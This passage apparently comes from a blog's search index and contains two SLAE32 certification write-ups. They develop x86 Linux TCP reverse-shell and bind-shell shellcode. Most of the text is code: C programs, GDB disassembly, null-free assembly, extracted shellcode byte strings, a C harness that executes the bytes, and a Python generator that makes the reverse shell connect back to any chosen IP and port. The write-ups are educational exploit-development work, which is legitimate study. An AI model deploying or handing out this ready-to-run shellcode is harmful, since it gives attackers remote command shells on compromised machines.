= pointer to filename on stack ; 0x0 = argv[] ; 0x0 = anvp[] ; --------------------------------------------------------------------------------- 0x00400751 &amp;lt;+196&amp;gt;: add esp,0x10 0x00400754 &amp;lt;+199&amp;gt;: sub esp,0xc 0x00400757 &amp;lt;+202&amp;gt;: push DWORD PTR [ebp-0x20] 0x0040075a &amp;lt;+205&amp;gt;: call 0x400530 &amp;lt;close@plt&amp;gt; 0x0040075f &amp;lt;+210&amp;gt;: add esp,0x10 0x00400762 &amp;lt;+213&amp;gt;: mov eax,0x0 0x00400767 &amp;lt;+218&amp;gt;: mov edx,DWORD PTR [ebp-0xc] 0x0040076a &amp;lt;+221&amp;gt;: xor edx,DWORD PTR gs:0x14 0x00400771 &amp;lt;+228&amp;gt;: je 0x400778 &amp;lt;main+235&amp;gt; 0x00400773 &amp;lt;+230&amp;gt;: call 0x400800 &amp;lt;__stack_chk_fail_local&amp;gt; 0x00400778 &amp;lt;+235&amp;gt;: lea esp,[ebp-0x8] 0x0040077b &amp;lt;+238&amp;gt;: pop ecx 0x0040077c &amp;lt;+239&amp;gt;: pop ebx 0x0040077d &amp;lt;+240&amp;gt;: pop ebp 0x0040077e &amp;lt;+241&amp;gt;: lea esp,[ecx-0x4] 0x00400781 &amp;lt;+244&amp;gt;: ret End of assembler dump.Phase 3: Writing shellcode that creates a TCP reverse shellNow that we have an understanding of what is happening at an assembly level behind the scenes we will convert it into usable shellcode. Things to keep in mind here is that we cannot have any null bytes, size matters, and that the target address and port number should be configurable.socketWe start by establishing a socket using socketcall. This will return to us a sockfd identifier that we will need to save for use in future calls.xor eax, eax ; zero out eaxmov ebx, eax ; zero out ebxpush eax ; push 0 to stack (protocol: 0 (nonblocking))mov al, 0x66 ; socketcallmov bl, 1 ; sys_socketpush ebx ; push 1 to stack (type: SOCK_STREAM)push 2 ; domain: AF_INETmov ecx, esp ; save pointer to stackint 0x80connectWe now connect to a target IP address and port. In this example I’m using the IP address 192.168.1.122 and port 6789. These values must be in network byte order and I have written a script to generate these values for you here =&amp;gt;mov edi,eax ; save sockfdmov al,0x66 ; socketcallmov bl,3 ; sys_connectpush 0x7a01a8c0 ; ip address (192.168.1.122) ; sockaddr_in structpush word 0x851a ; port number (6789) ; sockaddr_in structpush word 2 ; AF_INET ; sockaddr_in structmov ecx,esp ; save pointer to structpush 0x10 ; push struct lengthpush ecx ; push pointer to structpush edi ; push sockfdmov ecx,esp ; save pointer to stackint 0x80dup2The dup2 function will duplicate the STDOUT/STDIN/STDERR file descriptors onto the sockfd. This will allow all output to be seen on the sockfd from the connect so the receiver of the reverse shell can see all output.xor ecx,ecx ; zero out ecx mov ebx,edi mov al, 0x3f ; dup2dup2_loop: int 0x80 mov al,0x3f ; dup2 inc ecx ; increment ecx until we hit 2 cmp ecx, 2 ; test if we&#39;re at 2 jle dup2_loop ; if not, keep calling dup2execveFinally, we actually exec /bin/sh to complete the reverse shell. At this point the target of the reverse shell should be able to enter commands and see responses.mov al,0xb ; execvexor edx,edx ; zero out edxpush edx ; push edx to stack to terminate stringpush 0x68732f6e ; n/shpush 0x69622f2f ; //bimov ebx, esp ; save pointer to stack to ecxmov ecx, edx ; argv[];mov edx, edx ; envp[]int 0x80Using objdump we can verify no null bytes are in the assembly we just wrote[sengen@manjaro-x86 assignment2]$ objdump -d ./rev_shell_asm -M intel./rev_shell_asm: file format elf32-i386Disassembly of section .text:08048060 &amp;lt;_start&amp;gt;: 8048060: 31 c0 xor eax,eax 8048062: 89 c3 mov ebx,eax 8048064: 50 push eax 8048065: b0 66 mov al,0x66 8048067: b3 01 mov bl,0x1 8048069: 53 push ebx 804806a: 6a 02 push 0x2 804806c: 89 e1 mov ecx,esp 804806e: cd 80 int 0x80 8048070: 89 c7 mov edi,eax 8048072: b0 66 mov al,0x66 8048074: b3 03 mov bl,0x3 8048076: 68 c0 a8 01 7a push 0x7a01a8c0 804807b: 66 68 1a 85 pushw 0x851a 804807f: 66 6a 02 pushw 0x2 8048082: 89 e1 mov ecx,esp 8048084: 6a 10 push 0x10 8048086: 51 push ecx 8048087: 57 push edi 8048088: 89 e1 mov ecx,esp 804808a: cd 80 int 0x80 804808c: 31 c9 xor ecx,ecx 804808e: 89 fb mov ebx,edi 8048090: b0 3f mov al,0x3f08048092 &amp;lt;dup2_loop&amp;gt;: 8048092: cd 80 int 0x80 8048094: b0 3f mov al,0x3f 8048096: 41 inc ecx 8048097: 83 f9 02 cmp ecx,0x2 804809a: 7e f6 jle 8048092 &amp;lt;dup2_loop&amp;gt; 804809c: b0 0b mov al,0xb 804809e: 31 d2 xor edx,edx 80480a0: 52 push edx 80480a1: 68 6e 2f 73 68 push 0x68732f6e 80480a6: 68 2f 2f 62 69 push 0x69622f2f 80480ab: 89 e3 mov ebx,esp 80480ad: 89 d1 mov ecx,edx 80480af: cd 80 int 0x80 80480b1: b0 06 mov al,0x6 80480b3: 89 fb mov ebx,edi 80480b5: cd 80 int 0x80Source CodeYou can grab the source code for both the C and assembly programs from the following location:https://github.com/tdmathison/SLAE32/tree/master/assignment2We can extract the bytes with objdump[sengen@manjaro-x86 assignment2]$ objdump -d ./rev_shell_asm|grep &#39;[0-9a-f]:&#39;|grep -v &#39;file&#39;|cut -f2 -d:|cut -f1-6 -d&#39; &#39;|tr -s &#39; &#39;|tr &#39;\\t&#39; &#39; &#39;|sed &#39;s/ $//g&#39;|sed &#39;s/ /\\\\x/g&#39;|paste -d &#39;&#39; -s |sed &#39;s/^/&quot;/&#39;|sed &#39;s/$/&quot;/g&#39;&quot;\\x31\\xc0\\x89\\xc3\\x50\\xb0\\x66\\xb3\\x01\\x53\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc7\\xb0\\x66\\xb3\\x03\\x68\\xc0\\xa8\\x01\\x7a\\x66\\x68\\x1a\\x85\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x10\\x51\\x57\\x89\\xe1\\xcd\\x80\\x31\\xc9\\x89\\xfb\\xb0\\x3f\\xcd\\x80\\xb0\\x3f\\x41\\x83\\xf9\\x02\\x7e\\xf6\\xb0\\x0b\\x31\\xd2\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x89\\xd1\\xcd\\x80\\xb0\\x06\\x89\\xfb\\xcd\\x80&quot;Add it to a test C program#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;string.h&amp;gt;unsigned char code[] = \\&quot;\\x31\\xc0\\x89\\xc3\\x50\\xb0\\x66\\xb3\\x01\\x53\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc7\\xb0\\x66\\xb3\\x03\\x68\\xc0\\xa8\\x01\\x7a\\x66\\x68\\x1a\\x85\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x10\\x51\\x57\\x89\\xe1\\xcd\\x80\\x31\\xc9\\x89\\xfb\\xb0\\x3f\\xcd\\x80\\xb0\\x3f\\x41\\x83\\xf9\\x02\\x7e\\xf6\\xb0\\x0b\\x31\\xd2\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x89\\xd1\\xcd\\x80\\xb0\\x06\\x89\\xfb\\xcd\\x80&quot;;main(){ printf(&quot;Shellcode Length: %d\\n&quot;, strlen(code)); int (*ret)() = (int(*)())code; ret();}Start listening with netcatExecute reverse shell shellcodeClient received shell and can execute commandsPhase 4: Write a wrapper python scriptI wrote a helper python script that will generate the shellcode with target IP address and port.[sengen@sengen assignment2]$ python create_rev_shell.pyUsage: create_rev_shell.py [options]Generates Reverse TCP Shell shellcode.Options: -h, --help show this help message and exit -i IP_ADDRESS, --ip-address=IP_ADDRESS IP address to connect back to -p PORT, --port=PORT Port to connect back toGenerating shellcode that can used in exploit or C program[sengen@sengen assignment2]$ python create_rev_shell.py -i 192.168.1.122 -p 6789\\x31\\xc0\\x89\\xc3\\x50\\xb0\\x66\\xb3\\x01\\x53\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc7\\xb0\\x66\\xb3\\x03\\x68\\xc0\\xa8\\x01\\x7a\\x66\\x68\\x1a\\x85\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x10\\x51\\x57\\x89\\xe1\\xcd\\x80\\x31\\xc9\\x89\\xfb\\xb0\\x3f\\xcd\\x80\\xb0\\x3f\\x41\\x83\\xf9\\x02\\x7e\\xf6\\xb0\\x0b\\x31\\xd2\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x89\\xd1\\xcd\\x80\\xb0\\x06\\x89\\xfb\\xcd\\x80" }, { "title": "SLAE32: Creating TCP Bind Shellcode", "url": "/posts/slae32-1/", "categories": "SLAE32", "tags": "assembly, x86, penetration-testing, hacking, exploit-development, shellcode, slae32", "date": "2018-01-03 11:00:00 -0800", "snippet": "The blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/Student ID: SLAE-990Assignment #1Goals Explain the process of how to create TCP Bind Shell shellcode The shellcode should: Binds to a local port Execs shell on incoming connection The Port number should be easily configurable PhasesTo accomplish this I’m going to split this into four phases: Understand the system calls made by creating and analyzing a C program written by reading the linux programmers documentation that would behave the same way. Debug the C program to figure out how parameters are being passed around in memory or through registers to make it work. Writing assembly that can be used as shellcode that does the same thing (meaning it must at least not have any null bytes while still being functional). Write a wrapper python script that lets you specify a port and it will emmit the full shellcode ready for use.Phase 1: Writing a TCP bind shell in CTo analize what is happening at a system call level we will need to refer to the Linux developer man pages to understand how we should go about setting up a socket and binding it to a port on the local system (bind shell). The easiest way to go about this is to attempt to write a bare minimum C program that accomplishes this task by referring to the man2 pages for each step.The beginning of any socket programming is establishing a socket so I started by looking up the man page of this system call. Based on reading through the man pages I was able to piece together what calls would need to be made in order to establish a listening connection on a specific port.The prototypes of the functions that we will want to call are in the following order below (with the man page link referenced):/* http://man7.org/linux/man-pages/man2/socket.2.html */int socket(int domain, int type, int protocol);/* http://man7.org/linux/man-pages/man2/bind.2.html */int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);/* http://man7.org/linux/man-pages/man2/listen.2.html */int listen(int sockfd, int backlog);/* http://man7.org/linux/man-pages/man2/accept.2.html */int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);/* http://man7.org/linux/man-pages/man2/dup.2.html */int dup2(int oldfd, int newfd);/* http://man7.org/linux/man-pages/man2/execve.2.html */int execve(const char *filename, char *const argv[], char *const envp[]);/* http://man7.org/linux/man-pages/man2/close.2.html */int close(int fd);I wrote the following C program that creates this bind shell and compiled and ran it to confirm it functions properly.#include &amp;lt;sys/types.h&amp;gt;#include &amp;lt;sys/socket.h&amp;gt;#include &amp;lt;netinet/in.h&amp;gt;#define NULL 0int socket(int domain, int type, int protocol);int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);int listen(int sockfd, int backlog);int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);int dup2(int oldfd, int newfd);int close(int fd);int execve(const char *filename, char *const argv[], char *const envp[]);int main() { int port = 6789; /* this creates a new socket but it has no address assigned to it yet */ int sockfd = socket(AF_INET /* 2 */, SOCK_STREAM /* 1 */, 0); /* create sockaddr structure for use with bind function */ struct sockaddr_in hostaddr; hostaddr.sin_family = AF_INET; hostaddr.sin_port = htons(port); hostaddr.sin_addr.s_addr = htonl(INADDR_ANY); /* bind socket to ip/port */ bind(sockfd, (struct sockaddr*)&amp;amp;hostaddr, sizeof(struct sockaddr_in)); /* listen for connections */ listen(sockfd, 1); /* accept connection */ int clientfd = accept(sockfd, NULL, NULL); /* duplicate file descriptors for STDIN/STDOUT/STDERR */ for (int n = 0; n &amp;lt;= 2; ++n) { dup2(clientfd, n); } /* execute /bin/sh */ execve(&quot;/bin/sh&quot;, NULL, NULL); close(sockfd); return 0;}Building and running bind shell C programShowing port 9999 now listeningConnecting to bind shellPhase 2: Understanding how parameters are passed around using strace and GDBThe idea of debugging this was to set a breakpoint at each system call and analyze the registers and stack to see what is needed at the point of the call. With this information we can then come up with our own way to get the same values setup properly in a shellcode safe manner.We can get a quick view of the calls with strace as seen here (this is useful and is helpful when looking at the assembly dump in GDB). In most cases, you can see the value of each parameter that was used to the function calls which would be either on the stack or in one of the registers. In the case of a parameter value that is enclosed in curly braces {} this is likely a pointer to a struct that resides on the stack.[sengen@manjaro-x86 assignment1]$ strace -e socket,bind,listen,accept,dup2,execve ./bind_shell_cexecve(&quot;./bind_shell_c&quot;, [&quot;./bind_shell_c&quot;], 0xbfc4b6a8 /* 54 vars */) = 0socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3bind(3, {sa_family=AF_INET, sin_port=htons(6789), sin_addr=inet_addr(&quot;0.0.0.0&quot;)}, 16) = 0listen(3, 1) = 0accept(3, NULL, NULL) = 4dup2(4, 0) = 0dup2(4, 1) = 1dup2(4, 2) = 2execve(&quot;/bin/sh&quot;, NULL, NULL) = 0socket(AF_UNIX, SOCK_STREAM|SOCK_CLOEXEC|SOCK_NONBLOCK, 0) = 5socket(AF_UNIX, SOCK_STREAM|SOCK_CLOEXEC|SOCK_NONBLOCK, 0) = 5--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=25697, si_uid=1000, si_status=0, si_utime=0, si_stime=0} ------ SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=25698, si_uid=1000, si_status=0, si_utime=0, si_stime=0} ---+++ exited with 0 +++The following is the dump of the main function. I put breakpoints before each function call I was interested in and printed the relevant register or stack information for use when I write my shellcode.gdb$ break mainBreakpoint 1 at 0x6fcgdb$ runBreakpoint 1, 0x004006fc in main ()gdb$ disassemble mainDump of assembler code for function main: 0x004006ed &amp;lt;+0&amp;gt;: lea ecx,[esp+0x4] 0x004006f1 &amp;lt;+4&amp;gt;: and esp,0xfffffff0 0x004006f4 &amp;lt;+7&amp;gt;: push DWORD PTR [ecx-0x4] 0x004006f7 &amp;lt;+10&amp;gt;: push ebp 0x004006f8 &amp;lt;+11&amp;gt;: mov ebp,esp 0x004006fa &amp;lt;+13&amp;gt;: push ebx 0x004006fb &amp;lt;+14&amp;gt;: push ecx=&amp;gt; 0x004006fc &amp;lt;+15&amp;gt;: sub esp,0x30 0x004006ff &amp;lt;+18&amp;gt;: call 0x4005f0 &amp;lt;__x86.get_pc_thunk.bx&amp;gt; 0x00400704 &amp;lt;+23&amp;gt;: add ebx,0x18fc 0x0040070a &amp;lt;+29&amp;gt;: mov eax,gs:0x14 0x00400710 &amp;lt;+35&amp;gt;: mov DWORD PTR [ebp-0xc],eax 0x00400713 &amp;lt;+38&amp;gt;: xor eax,eax 0x00400715 &amp;lt;+40&amp;gt;: mov DWORD PTR [ebp-0x28],0x1a85 0x0040071c &amp;lt;+47&amp;gt;: sub esp,0x4 ; socket -------------------------------------------------------------------------- 0x0040071f &amp;lt;+50&amp;gt;: push 0x0 0x00400721 &amp;lt;+52&amp;gt;: push 0x1 0x00400723 &amp;lt;+54&amp;gt;: push 0x2 0x00400725 &amp;lt;+56&amp;gt;: call 0x400580 &amp;lt;socket@plt&amp;gt; ; gdb$ x/3w $esp ; 0xbffff020: 0x00000002 0x00000001 0x00000000 ; ; parameters: ; 0x00000002 = AF_INET ; 0x00000001 = SOCK_STREAM ; 0x00000000 = IPPROTO_IP ; --------------------------------------------------------------------------------- ; bind ---------------------------------------------------------------------------- 0x0040072a &amp;lt;+61&amp;gt;: add esp,0x10 0x0040072d &amp;lt;+64&amp;gt;: mov DWORD PTR [ebp-0x24],eax 0x00400730 &amp;lt;+67&amp;gt;: mov WORD PTR [ebp-0x1c],0x2 0x00400736 &amp;lt;+73&amp;gt;: mov eax,DWORD PTR [ebp-0x28] 0x00400739 &amp;lt;+76&amp;gt;: movzx eax,ax 0x0040073c &amp;lt;+79&amp;gt;: sub esp,0xc 0x0040073f &amp;lt;+82&amp;gt;: push eax 0x00400740 &amp;lt;+83&amp;gt;: call 0x400510 &amp;lt;htons@plt&amp;gt; 0x00400745 &amp;lt;+88&amp;gt;: add esp,0x10 0x00400748 &amp;lt;+91&amp;gt;: mov WORD PTR [ebp-0x1a],ax 0x0040074c &amp;lt;+95&amp;gt;: sub esp,0xc 0x0040074f &amp;lt;+98&amp;gt;: push 0x0 0x00400751 &amp;lt;+100&amp;gt;: call 0x400560 &amp;lt;htonl@plt&amp;gt; 0x00400756 &amp;lt;+105&amp;gt;: add esp,0x10 0x00400759 &amp;lt;+108&amp;gt;: mov DWORD PTR [ebp-0x18],eax 0x0040075c &amp;lt;+111&amp;gt;: sub esp,0x4 0x0040075f &amp;lt;+114&amp;gt;: push 0x10 0x00400761 &amp;lt;+116&amp;gt;: lea eax,[ebp-0x1c] 0x00400764 &amp;lt;+119&amp;gt;: push eax 0x00400765 &amp;lt;+120&amp;gt;: push DWORD PTR [ebp-0x24] 0x00400768 &amp;lt;+123&amp;gt;: call 0x400550 &amp;lt;bind@plt&amp;gt; ; gdb$ x/3w $esp ; 0xbffff020: 0x00000003 0xbffff04c 0x00000010 ; parameters: ; 0x00000003 = sockfd ; 0xbffff04c = pointer to sockaddr_in struct on stack ; 0x00000010 = length of sockaddr_in ; sockaddr_in struct on stack ; gdb$ x/8b 0xbffff04c ; 0xbffff04c: 0x02 0x00 0x1a 0x85 0x00 0x00 0x00 0x00 ; parameters: ; 0x02 = AF_INET ; 0x1a85 = Port number (6789) *reverse byte order* ; 0x00000000 = 0x0 ; --------------------------------------------------------------------------------- ; listen -------------------------------------------------------------------------- 0x0040076d &amp;lt;+128&amp;gt;: add esp,0x10 0x00400770 &amp;lt;+131&amp;gt;: sub esp,0x8 0x00400773 &amp;lt;+134&amp;gt;: push 0x1 0x00400775 &amp;lt;+136&amp;gt;: push DWORD PTR [ebp-0x24] 0x00400778 &amp;lt;+139&amp;gt;: call 0x400570 &amp;lt;listen@plt&amp;gt; ; gdb$ x/2w $esp ; 0xbffff020: 0x00000003 0x00000001 ; ; parameters: ; 0x00000003 = sockfd ; 0x00000001 = backlog ; --------------------------------------------------------------------------------- ; accept -------------------------------------------------------------------------- 0x0040077d &amp;lt;+144&amp;gt;: add esp,0x10 0x00400780 &amp;lt;+147&amp;gt;: sub esp,0x4 0x00400783 &amp;lt;+150&amp;gt;: push 0x0 0x00400785 &amp;lt;+152&amp;gt;: push 0x0 0x00400787 &amp;lt;+154&amp;gt;: push DWORD PTR [ebp-0x24] 0x0040078a &amp;lt;+157&amp;gt;: call 0x400520 &amp;lt;accept@plt&amp;gt; ; gdb$ x/3w $esp ; 0xbffff020: 0x00000003 0x00000000 0x00000000 ; ; parameters: ; 0x00000003 = sockfd ; 0x00000000 = sockaddr (NULL) ; dont need client struct ; 0x00000000 = addrlen (NULL) ; dont need client struct ; --------------------------------------------------------------------------------- ; dup2 ---------------------------------------------------------------------------- 0x0040078f &amp;lt;+162&amp;gt;: add esp,0x10 0x00400792 &amp;lt;+165&amp;gt;: mov DWORD PTR [ebp-0x20],eax 0x00400795 &amp;lt;+168&amp;gt;: mov DWORD PTR [ebp-0x2c],0x0 0x0040079c &amp;lt;+175&amp;gt;: jmp 0x4007b3 &amp;lt;main+198&amp;gt; 0x0040079e &amp;lt;+177&amp;gt;: sub esp,0x8 0x004007a1 &amp;lt;+180&amp;gt;: push DWORD PTR [ebp-0x2c] 0x004007a4 &amp;lt;+183&amp;gt;: push DWORD PTR [ebp-0x20] 0x004007a7 &amp;lt;+186&amp;gt;: call 0x400500 &amp;lt;dup2@plt&amp;gt; ; gdb$ x/2w $esp ; 0xbffff020: 0x00000004 0x00000000 ; gdb$ x/2w $esp ; 0xbffff020: 0x00000004 0x00000001 ; gdb$ x/2w $esp ; 0xbffff020: 0x00000004 0x00000002 ; parameters: ; 0x00000004 = oldfd ; 0x0000000[0-2] = newfd ; --------------------------------------------------------------------------------- ; excecve ------------------------------------------------------------------------- 0x004007ac &amp;lt;+191&amp;gt;: add esp,0x10 0x004007af &amp;lt;+194&amp;gt;: add DWORD PTR [ebp-0x2c],0x1 0x004007b3 &amp;lt;+198&amp;gt;: cmp DWORD PTR [ebp-0x2c],0x2 0x004007b7 &amp;lt;+202&amp;gt;: jle 0x40079e &amp;lt;main+177&amp;gt; 0x004007b9 &amp;lt;+204&amp;gt;: sub esp,0x4 0x004007bc &amp;lt;+207&amp;gt;: push 0x0 0x004007be &amp;lt;+209&amp;gt;: push 0x0 0x004007c0 &amp;lt;+211&amp;gt;: lea eax,[ebx-0x175c] 0x004007c6 &amp;lt;+217&amp;gt;: push eax 0x004007c7 &amp;lt;+218&amp;gt;: call 0x400540 &amp;lt;execve@plt&amp;gt; ; gdb$ x/a $esp ; 0xbffff020: 0x4008a4 =&amp;gt; &quot;/bin/sh&quot; ; gdb$ x/2c $esp+4 ; 0xbffff024: 0x0 0x0 ; ; parameters: ; 0x4008a4 = pointer to filename on stack ; 0x0 = argv[] ; 0x0 = anvp[] ; --------------------------------------------------------------------------------- 0x004007cc &amp;lt;+223&amp;gt;: add esp,0x10 0x004007cf &amp;lt;+226&amp;gt;: sub esp,0xc 0x004007d2 &amp;lt;+229&amp;gt;: push DWORD PTR [ebp-0x24] 0x004007d5 &amp;lt;+232&amp;gt;: call 0x400590 &amp;lt;close@plt&amp;gt; ; Closes sockfd which tears down the socket ; --------------------------------------------------------------------------------- 0x004007da &amp;lt;+237&amp;gt;: add esp,0x10 0x004007dd &amp;lt;+240&amp;gt;: mov eax,0x0 0x004007e2 &amp;lt;+245&amp;gt;: mov edx,DWORD PTR [ebp-0xc] 0x004007e5 &amp;lt;+248&amp;gt;: xor edx,DWORD PTR gs:0x14 0x004007ec &amp;lt;+255&amp;gt;: je 0x4007f3 &amp;lt;main+262&amp;gt; 0x004007ee &amp;lt;+257&amp;gt;: call 0x400870 &amp;lt;__stack_chk_fail_local&amp;gt; 0x004007f3 &amp;lt;+262&amp;gt;: lea esp,[ebp-0x8] 0x004007f6 &amp;lt;+265&amp;gt;: pop ecx 0x004007f7 &amp;lt;+266&amp;gt;: pop ebx 0x004007f8 &amp;lt;+267&amp;gt;: pop ebp 0x004007f9 &amp;lt;+268&amp;gt;: lea esp,[ecx-0x4] 0x004007fc &amp;lt;+271&amp;gt;: ret End of assembler dump.NOTE: For the socket calls there are two approaches; using socketcall with sub-functions, or separate system calls for each (socket, accept, bind, etc). The former is less portable but may allow for cleaner shellcode due to the reuse of the socketcall value.In this assembly dump it is calling out to the memory address of the function and putting it’s parameters to the function on the stack. In our shellcode we’ll use socketcall with parameters in the registers. Either would work, however.Phase 3: Writing shellcode that creates a TCP bind shellNow that we have an understanding of what is happening at an assembly level behind the scenes we will convert it into usable shellcode. Things to keep in mind here is that we cannot have any null bytes, size matters, and that the port number should be configurable.socketWe start by establishing a socket using socketcall. This will return to us a sockfd identifier that we will need to save for use in future calls.xor eax, eax ; zero out eaxmov ebx, eax ; zero out ebxpush eax ; push 0 to stack (protocol: 0 (nonblocking))mov al, 0x66 ; socketcallmov bl, 1 ; sys_socketpush ebx ; push 1 to stack (type: SOCK_STREAM)push 2 ; domain: AF_INETmov ecx, esp ; save pointer to stackint 0x80bindThis is where we bind the socket previously created to the local interface prior to start listening for connections.mov edi,eax ; save sockfdmov al,0x66 ; socketcallpop ebx ; sys_bind - grab 2 from stackpop ebx ; take 1 off stackinc ebxpush word 0x851a ; port 6789 (reverse byte order) ; sockaddr structpush word 2 ; AF_INET ; sockaddr structmov ecx,esp ; save pointer to struct in ecx ; sockaddr structpush 0x10 ; struct lengthpush ecx ; push pointer to structpush edi ; push sockfdmov ecx,esp ; save stack pointerint 0x80listenAt this point we start listening for connections on our specified port. The backlog parameter defines the allowed queue length of pending connections to our sockfd. For this example I just set it to 1 but it could be more if multiple connections are wanted.mov al, 0x66 ; socketcallmov bl, 4 ; sys_listenpush 1 ; parameter: backlogpush edi ; parameter: sockfdmov ecx,esp ; save pointer to stack to ecxint 0x80acceptWhen a client connects to this port we call the accept system call which will give us a new sockfd for the client. In this case we only care about the identifier but you can also collect more information and save it into a sockaddr struct but this would be useless for us so I set this to NULL.mov al,0x66 ; socketcallinc bl ; sys_acceptpush edx ; clientfd (NULL - dont need this)push edx ; sizeof(clientfd) (NULL - dont need this)push edi ; sockfdmov ecx,esp ; save pointer to stack to ecxint 0x80dup2The dup2 function will duplicate the STDOUT/STDIN/STDERR file descriptors onto the sockfd. This will allow all output to be seen on the sockfd from the connect so the receiver of the reverse shell can see all output.xor ecx,ecx ; zero out ecxmov ebx,eax ; save clientfdmov al, 0x3f ; dup2dup2_loop:int 0x80 mov al,0x3f ; dup2inc ecx ; increment ecx until we hit 2cmp ecx, 2 ; test if we&#39;re at 2jle dup2_loop ; if not, keep calling dup2execveFinally, we actually exec /bin/sh to complete the reverse shell. At this point the target of the reverse shell should be able to enter commands and see responses.mov al,0xb ; execvexor edx,edx ; zero out edxpush edx ; push edx to stack to terminate stringpush 0x68732f6e ; n/shpush 0x69622f2f ; //bimov ebx, esp ; save pointer to stack to ecxmov ecx, edx ; argv[];mov edx, edx ; envp[]int 0x80Dealing with null bytesMost of these are simple to remove as they are due to referencing the full 32bit register where we can simply reference the 8 bit register.For moving values into registers:mov eax,0x66 should be converted to mov al,0x66mov ebx,0x1 should be converted to mov bl,0x1For the pushing of 0x0 we need to use a different approach. We can either find a null byte already on the stack or we can use a zero’ed out register and push that to the stack (often requiring us to explicitly zero it out first).Example:push 0x0can change into:xor edx,edx ; zero out edxpush edx ; push edx to stack to terminate stringYou can use objdump to quicly identify null bytes in the assembly. I have marked where I initially had to deal with null bytes.; initial shellcode[sengen@manjaro-x86 assignment1]$ objdump -d ./bind_shell_asm2 -M intel./bind_shell_asm2: file format elf32-i386Disassembly of section .text:08048060 &amp;lt;_start&amp;gt;: 8048060: 31 c0 xor eax,eax 8048062: 89 c3 mov ebx,eax 8048064: 50 push eax 8048065: b8 66 00 00 00 mov eax,0x66 ; &amp;lt;== 804806a: bb 01 00 00 00 mov ebx,0x1 ; &amp;lt;== 804806f: 53 push ebx 8048070: 6a 02 push 0x2 8048072: 89 e1 mov ecx,esp 8048074: cd 80 int 0x80 8048076: 89 c7 mov edi,eax 8048078: b8 66 00 00 00 mov eax,0x66 ; &amp;lt;== 804807d: bb 02 00 00 00 mov ebx,0x2 ; &amp;lt;== 8048082: 6a 00 push 0x0 ; &amp;lt;== 8048084: 66 68 1a 85 pushw 0x851a 8048088: 66 6a 02 pushw 0x2 804808b: 89 e1 mov ecx,esp 804808d: 6a 10 push 0x10 804808f: 51 push ecx 8048090: 57 push edi 8048091: 89 e1 mov ecx,esp 8048093: cd 80 int 0x80 8048095: b8 66 00 00 00 mov eax,0x66 ; &amp;lt;== 804809a: bb 04 00 00 00 mov ebx,0x4 ; &amp;lt;== 804809f: 6a 01 push 0x1 80480a1: 57 push edi 80480a2: 89 e1 mov ecx,esp 80480a4: cd 80 int 0x80 80480a6: b8 66 00 00 00 mov eax,0x66 ; &amp;lt;== 80480ab: bb 05 00 00 00 mov ebx,0x5 ; &amp;lt;== 80480b0: 6a 00 push 0x0 ; &amp;lt;== 80480b2: 6a 00 push 0x0 ; &amp;lt;== 80480b4: 57 push edi 80480b5: 89 e1 mov ecx,esp 80480b7: cd 80 int 0x80 80480b9: 31 c9 xor ecx,ecx 80480bb: 89 c3 mov ebx,eax 80480bd: b8 3f 00 00 00 mov eax,0x3f ; &amp;lt;==080480c2 &amp;lt;dup2_loop&amp;gt;: 80480c2: cd 80 int 0x80 80480c4: b8 3f 00 00 00 mov eax,0x3f ; &amp;lt;== 80480c9: 41 inc ecx 80480ca: 83 f9 02 cmp ecx,0x2 80480cd: 7e f3 jle 80480c2 &amp;lt;dup2_loop&amp;gt; ; &amp;lt;== 80480cf: b8 0b 00 00 00 mov eax,0xb ; &amp;lt;== 80480d4: 6a 00 push 0x0 ; &amp;lt;== 80480d6: 68 6e 2f 73 68 push 0x68732f6e 80480db: 68 2f 2f 62 69 push 0x69622f2f 80480e0: 89 e3 mov ebx,esp 80480e2: b9 00 00 00 00 mov ecx,0x0 ; &amp;lt;== 80480e7: ba 00 00 00 00 mov edx,0x0 ; &amp;lt;== 80480ec: cd 80 int 0x80Notes on reversing “//bin/sh” string[sengen@manjaro-x86 assignment1]$ pythonPython 3.6.2 (default, Jul 20 2017, 15:08:48)[GCC 7.1.1 20170630] on linuxType &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.&amp;gt;&amp;gt;&amp;gt; import binascii&amp;gt;&amp;gt;&amp;gt; code=b&#39;//bin/sh&#39;&amp;gt;&amp;gt;&amp;gt; binascii.hexlify(code[::-1])b&#39;68732f6e69622f2f&#39;&amp;gt;&amp;gt;&amp;gt;Then you can push it to the stack in 4 byte segmentspush 0x68732f6epush 0x69622f2fSource CodeYou can grab the source code for both the C and assembly programs from the following location:https://github.com/tdmathison/SLAE32/tree/master/assignment1We can extract the bytes with objdump[sengen@manjaro-x86 assignment1]$ objdump -d ./bind_shell_asm|grep &#39;[0-9a-f]:&#39;|grep -v &#39;file&#39;|cut -f2 -d:|cut -f1-6 -d&#39; &#39;|tr -s &#39; &#39;|tr &#39;\\t&#39; &#39; &#39;|sed &#39;s/ $//g&#39;|sed &#39;s/ /\\\\x/g&#39;|paste -d &#39;&#39; -s |sed &#39;s/^/&quot;/&#39;|sed 